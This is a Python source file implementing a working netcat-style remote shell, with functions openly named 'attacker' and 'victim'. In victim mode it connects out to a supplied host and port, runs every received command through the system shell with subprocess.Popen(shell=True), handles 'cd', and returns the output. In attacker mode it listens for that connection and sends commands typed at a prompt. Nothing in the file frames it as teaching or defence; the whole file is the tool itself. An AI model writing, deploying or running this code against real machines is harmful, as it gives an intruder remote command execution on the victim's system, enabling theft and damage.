import sys
import getopt
import socket
import subprocess
import os
from threading import Thread
from time import sleep

HOST = ""
PORT = 0
LISTEN = False
SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def attacker_send_req(Con):
    while True:
        try:
            command = input('<netcat># ')
            if command == 'exit':
                Con.send(command.encode())
                break
            else:
                Con.send(command.encode())
        except:
            break

def attacker_recv_res(Con):
    while True:
        try:
            buffer = Con.recv(4096).decode()
        except:
            break
        if buffer == '':
            break
        print('netcat result')
        print(buffer)
        print('#' * 10)

def attacker():
    global SOCK, PORT
    SOCK.bind(('', PORT))
    SOCK.listen(10)
    Victim, _ = SOCK.accept()
    asr = Thread(target=attacker_send_req, args=(Victim,))
    arr = Thread(target=attacker_recv_res, args=(Victim,))
    asr.start()
    arr.start()
    asr.join()
    arr.join()
    SOCK.close()

def victim_exec_req(Con):
    while True:
        try:
            command = Con.recv(4096).decode()
        except KeyboardInterrupt:
            break
        if command == 'exit':
            sys.exit(0)
        elif command[:2] == 'cd':
            os.chdir(command[3:])
        else:
            process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = process.communicate()
            if stdout == b'':
                Con.send(stderr)
            else:
                Con.send(stdout)

def victim():
    global HOST, PORT, SOCK
    SOCK.connect((HOST, PORT))
    victim_exec_req(SOCK)
    SOCK.close()

def main():
    global HOST, PORT, LISTEN
    try:
        args, _ = getopt.getopt(sys.argv[1:], "p:h:")
    except getopt.GetoptError:
        args, _ = getopt.getopt(sys.argv[1:], "p:l")
    for key, value in args:
        if key == '-p':
            PORT = int(value)
        if key == '-h':
            HOST = value
        if key == '-l':
            LISTEN = True
    if LISTEN:
        attacker()
    else:
        victim()

if __name__ == '__main__':
    main()